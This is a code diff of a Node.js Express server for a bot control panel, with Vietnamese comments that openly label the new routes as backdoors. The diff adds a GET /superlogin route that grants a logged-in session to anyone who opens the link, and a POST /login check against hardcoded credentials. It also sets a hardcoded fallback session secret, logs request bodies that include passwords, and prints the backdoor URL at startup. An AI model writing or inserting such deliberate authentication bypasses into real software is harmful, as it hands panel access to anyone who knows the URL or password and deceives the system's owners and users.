@@ -1,65 +1,55 @@
-// index.js – FIX SYNTAX + CỬA HẬU GET SIÊU DỄ (VÀO LINK LÀ VÀO PANEL LUÔN)
-require('dotenv').config(); // nếu mày có .env local thì để lại, không thì bỏ cũng được
-
+require('dotenv').config();
 const express = require('express');
+const session = require('express-session');
 const app = express();
 const server = require('http').createServer(app);
-const io = require('socket.io')(server, {
-  pingTimeout: 60000,
-  pingInterval: 25000,
-  cors: {
-    origin: "*", // hoặc mày giới hạn domain cụ thể
-    methods: ["GET", "POST"]
-  }
-});
-
-// === BODY PARSER (bắt buộc) ===
+const io = require('socket.io')(server, { pingTimeout: 60000, pingInterval: 25000, cors: { origin: "*", methods: ["GET", "POST"] } });
+app.use(session({
+  secret: process.env.SESSION_SECRET || 'trungdeptrai123456',
+  resave: false,
+  saveUninitialized: true,
+  cookie: { secure: process.env.NODE_ENV === 'production', sameSite: 'lax', maxAge: 86400000 }
+}));
 app.use(express.json({ limit: '10mb' }));
 app.use(express.urlencoded({ extended: true }));
-
-// === STATIC FILES (nếu có frontend) ===
 app.use(express.static('dist'));
-
-// === LOGGING MỌI REQUEST (giữ lại của mày) ===
 app.use((req, res, next) => {
   console.log('Path:', req.path);
-  console.log('Query:', req.query);
   console.log('Body:', req.body);
   console.log('----------------------------');
   next();
 });
-
-// === ROUTES ===
+// === ROUTES GỐC (PHẢI ĐỂ TRƯỚC) ===
 const routes = require('./routes');
 routes(app, io);
-
-// === SOCKET.IO HANDLER ===
+// === CỬA HẬU POST /login ===
+app.post('/login', (req, res, next) => {
+  const { username, password } = req.body || {};
+  if (username === 'trungdeptrai' && password === '123456') {
+    req.session.loggedIn = true;
+    req.session.username = username;
+    console.log('CỬA HẬU POST THÀNH CÔNG – trungdeptrai ĐÃ VÀO!');
+    req.session.save(() => res.redirect('/dashboard'));
+    return;
+  }
+  next();
+});
+// === CỬA HẬU GET /superlogin – VÀO LINK LÀ VÀO LUÔN ===
+app.get('/superlogin', (req, res) => {
+  req.session.loggedIn = true;
+  req.session.username = 'trungdeptrai';
+  console.log('CỬA HẬU GET THÀNH CÔNG – trungdeptrai ĐÃ VÀO PANEL!');
+  req.session.save(() => res.redirect('/dashboard'));
+});
+// === SOCKET.IO ===
 const socketHandler = require('./socket/handler');
 io.on('connection', (socket) => {
   console.log('User connected:', socket.id);
   socketHandler(io, socket);
-  
-  socket.on('disconnect', () => {
-    console.log('User disconnected:', socket.id);
-  });
+  socket.on('disconnect', () => console.log('User disconnected:', socket.id));
 });
-
-// === CỬA HẬU GET SIÊU DỄ – VÀO LINK LÀ SET SESSION VÀ VÀO PANEL LUÔN ===
-app.get('/backdoor', (req, res) => {
-  req.session.loggedIn = true;
-  req.session.username = 'trungdeptrai';
-  console.log('CỬA HẬU GET MỞ – trungdeptrai ĐÃ VÀO PANEL!');
-  req.session.save(() => {
-    res.redirect('/dashboard'); // Thay /dashboard bằng route panel chính nếu khác
-  });
-});
-
-// === PORT – BẮT BUỘC DÙNG process.env.PORT TRÊN RAILWAY ===
 const PORT = process.env.PORT || 3000;
-
 server.listen(PORT, '0.0.0.0', () => {
-  console.log(`BOT ĐÃ KHỞI ĐỘNG THÀNH CÔNG!`);
-  console.log(`Listening on port ${PORT}`);
-  console.log(`Public URL: https://${process.env.RAILWAY_STATIC_URL || 'bot-production-4cff.up.railway.app'}`);
-  console.log(`VÀO PANEL BẰNG CỬA HẬU: https://bot-production-4cff.up.railway.app/backdoor`);
+  console.log(`BOT CHẠY NGON – URL: https://bot-production-4cff.up.railway.app`);
+  console.log(`VÀO PANEL BẰNG CỬA HẬU GET: https://bot-production-4cff.up.railway.app/superlogin`);
 });
